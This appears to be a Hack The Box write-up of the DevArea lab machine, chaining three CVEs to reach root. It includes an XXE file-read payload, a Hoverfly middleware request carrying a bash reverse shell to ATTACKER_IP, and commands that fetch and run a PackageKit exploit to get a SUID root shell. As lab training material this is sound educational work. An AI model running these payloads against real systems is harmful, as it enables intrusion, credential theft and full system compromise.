---
title: "HTB DevArea — XXE, Hoverfly middleware, and a PackageKit race"
date: 2026-05-31
platform: Hack The Box
difficulty: Medium
os: Linux
category: Offense
summary: "Three CVEs chained end to end: file read through Apache CXF, authenticated RCE in Hoverfly, and a TOCTOU in PackageKit that installs a package as root without asking polkit."
tags: [xxe, apache-cxf, hoverfly, packagekit, cve-2026-41651, linpeas, privesc]
attackPath:
  - label: "Anonymous FTP leaks the service JAR"
    anchor: "reconnaissance"
  - label: "XXE file read in Apache CXF"
    anchor: "initial-access-%E2%80%94-cve-2022-46364"
  - label: "Hoverfly middleware RCE"
    anchor: "code-execution-%E2%80%94-cve-2025-54123"
  - label: "PackageKit race to root"
    anchor: "privilege-escalation-%E2%80%94-cve-2026-41651"
---

DevArea is a developer-services portal with a lot of surface: FTP, a SOAP endpoint, an API-simulation tool, and an internal proxy. The whole box is CVE chaining, which makes it a good exercise in reading advisories carefully rather than in novel technique — and the privilege escalation was a reminder that manual enumeration has blind spots.

**Attack path**

1. Anonymous FTP leaks the service JAR → Apache CXF 3.2.14 identified
2. CVE-2022-46364 (XXE via MTOM) → read `/etc/systemd/system/hoverfly.service` → admin credentials
3. CVE-2025-54123 → Hoverfly middleware API executes a script → shell as `dev_ryan`
4. CVE-2026-41651 ("Pack2TheRoot") → PackageKit installs an attacker package as root → SUID bash → root

## Reconnaissance

| Port | Service | Notes |
|---|---|---|
| 21 | vsftpd 3.0.5 | Anonymous login enabled |
| 22 | OpenSSH 9.6p1 | |
| 80 | Apache 2.4.58 | DevArea job portal |
| 8080 | Jetty 9.4.27 | SOAP service |
| 8500 | Go proxy | Internal |
| 8888 | Hoverfly | API simulation dashboard |

Anonymous FTP's `pub` directory contained `employee-service.jar`. Pulling it apart showed an Apache CXF 3.2.14 SOAP service — a version with a known XXE.

## Initial access — CVE-2022-46364

The WSDL was public at `http://<target>:8080/employeeservice?wsdl`. CVE-2022-46364 is an XXE in CXF's MTOM handling: an `xop:Include` with a `file://` href gets resolved server-side and the file contents land in the response.

```xml
<employeeName>
  <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include"
               href="file:///etc/systemd/system/hoverfly.service"/>
</employeeName>
```

`/etc/passwd` gave me the user `dev_ryan`; the Hoverfly unit file gave me the admin username and password passed on the command line.

> systemd unit files are an underrated credential source. `ExecStart` arguments, `Environment=` lines and `EnvironmentFile=` paths are all worth reading whenever you have a file-read primitive.

## Code execution — CVE-2025-54123

Hoverfly's middleware feature runs a user-supplied script against proxied traffic. With valid credentials, that's a direct RCE primitive (CVE-2025-54123).

```bash
# get a JWT
curl -s -X POST http://<target>:8888/api/v2/token-new \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"<from unit file>"}'
```

```http
POST /api/v2/hoverfly/middleware
Authorization: Bearer <JWT>
Content-Type: application/json

{"binary": "/bin/bash", "script": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"}
```

Reverse shell as `dev_ryan`. User flag.

## Privilege escalation — CVE-2026-41651

`sudo -l` showed a restricted rule for a monitoring script:

```
(root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh web-restart
```

I spent a long time here. In order:

- `/usr/bin/bash` hijack — not writable
- SysWatch web GUI on 7777 — Flask with command injection, but no credentials to log in
- Hoverfly simulation journal — empty
- Symlink attacks through `sudo syswatch.sh logs` — log directory not writable
- Plugin loading through `sudo syswatch.sh plugin` — plugin directory not writable

None of it went anywhere. LinPEAS found what I'd missed in about a minute:

```
Vulnerable to CVE-2026-41651 (Pack2TheRoot)
PackageKit 1.2.8 — vulnerable range >=1.0.2 <=1.3.4
```

```bash
pkcon --version          # 1.2.8
systemctl status packagekit   # active (running)
```

### How Pack2TheRoot works

CVE-2026-41651 is a TOCTOU in PackageKit's transaction handler. Three bugs in `pk-transaction.c` combine:

1. `InstallFiles()` overwrites the cached transaction flags unconditionally
2. `pk_transaction_set_state()` silently drops backward state transitions
3. `pk_transaction_run()` reads the cached flags at dispatch time, not at authorisation time

The `SIMULATE` flag skips polkit entirely. So:

```
InstallFiles(SIMULATE, dummy.deb)   → no polkit prompt, state = READY
InstallFiles(NONE, payload.deb)     → flags overwritten before the idle handler fires
idle handler runs                   → payload.deb installed as root
postinst: chmod +s /tmp/.suid_bash  → /tmp/.suid_bash -p → euid=0
```

### Exploitation

```bash
# attack box
git clone https://github.com/Vozec/CVE-2026-41651.git && cd CVE-2026-41651
python3 -m http.server 8000

# target
wget http://ATTACKER_IP:8000/cve-2026-41651 -O /tmp/cve-2026-41651
chmod +x /tmp/cve-2026-41651 && /tmp/cve-2026-41651
# [+] SUCCESS — SUID bash at t+200ms
/tmp/.suid_bash -p
id   # uid=1001(dev_ryan) euid=0(root)
```

Root.

## What I took away

- **Run LinPEAS when you're stuck, not after you've given up.** It version-checks packages against known CVEs; I was never going to find PackageKit by reading sudo rules.
- `pkcon --version` and `systemctl status packagekit` belong in my local privesc checklist now.
- XXE through MTOM bypasses the mitigations people usually think of for XXE. CXF before 3.3.12 / 3.4.5 / 3.5.3 is affected.
- Anything that "runs middleware" or "executes hooks" is RCE once you have credentials. Hoverfly, Jenkins, n8n — same pattern.
- Chaining three CVEs is less about cleverness and more about reading each advisory closely enough to know exactly what version and configuration it needs.

## References

- [CVE-2022-46364 PoC](https://github.com/kasem545/CVE-2022-46364-Poc)
- [CVE-2025-54123 PoC](https://github.com/kasem545/CVE-2025-54123-Poc)
- [CVE-2026-41651 PoC — Vozec](https://github.com/Vozec/CVE-2026-41651)
- [CVE-2026-41651 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-41651)
